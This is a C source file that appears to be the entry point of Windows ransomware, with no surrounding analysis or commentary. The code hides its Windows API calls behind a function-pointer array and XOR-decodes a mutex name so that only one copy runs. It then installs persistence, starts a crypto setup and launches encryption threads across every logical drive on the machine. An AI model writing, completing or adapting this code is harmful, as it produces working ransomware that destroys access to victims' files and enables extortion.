#include "Persistent.h"
#include "Crypto.h"
#include "Threading.h"
#include "File.h"
#include "PE.h"
extern FARPROC APIArray[54];

int beginEncrypt() {
	typedef DWORD(WINAPI* MemeGetLogicalDriveStringsA)(DWORD nBufferLength, LPSTR lpBuffer);

	MemeGetLogicalDriveStringsA TempGetLogicalDriveStringsA = (MemeGetLogicalDriveStringsA)APIArray[2];

	DWORD driveStrSize = TempGetLogicalDriveStringsA(0, 0);
	LPSTR driveBuffer = (LPSTR)calloc(driveStrSize + 2, 1);
	if (!driveBuffer) {
		return -1;
	}

	TempGetLogicalDriveStringsA(driveStrSize, driveBuffer);

	for (int i = 0; i < driveStrSize - 1; i += strlen(driveBuffer) + 1) {
		launchThreadEncrypt(driveBuffer + i);
	}
	free(driveBuffer);
	return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	if (initAPIArray() == -1) {
		printf("Fails\n");
		return -1;
	}

	BYTE mutex_key[5] = { 41, 188, 104, 237, 166 };
	BYTE mutex_str[25] = { 161, 33, 254, 104, 60, 181, 42, 241, 38, 97, 184, 41, 230, 117, 41, 166, 49, 237, 121, 52, 224, 116, 161, 43, 89 };

	// Mutex wbizecif48njqgpprzkm6769
	for (int i = 0; i < 25; i++) {
		mutex_str[i] ^= 0xFF;
		mutex_str[i] ^= mutex_key[i % 5];
	}

	typedef HANDLE(WINAPI* MemeCreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);

	MemeCreateMutexA TempCreateMutexA = (MemeCreateMutexA)APIArray[52];

	HANDLE hMutex = TempCreateMutexA(NULL, TRUE, (LPCSTR)mutex_str);

	typedef DWORD(WINAPI* MemeWaitForSingleObject)(HANDLE hHandle, DWORD  dwMilliseconds);

	MemeWaitForSingleObject TempWaitForSingleObject = (MemeWaitForSingleObject)APIArray[53];

	if (TempWaitForSingleObject(hMutex, 0)) {
		return -1;
	}
	if (mainPersist() == -1) {
		return -1;
	}
	if (cryptInit() == -1) {
		return -1;
	}
	findExplorerExe();
	if (initThreadStruct() == -1) {
		cryptCleanUp();
		cleanExplorerLL();
		return -1;
	}

	beginEncrypt();
	cleanUpThread();
	cryptCleanUp();
	cleanExplorerLL();
	persistCleanUp();
	return 0;
}
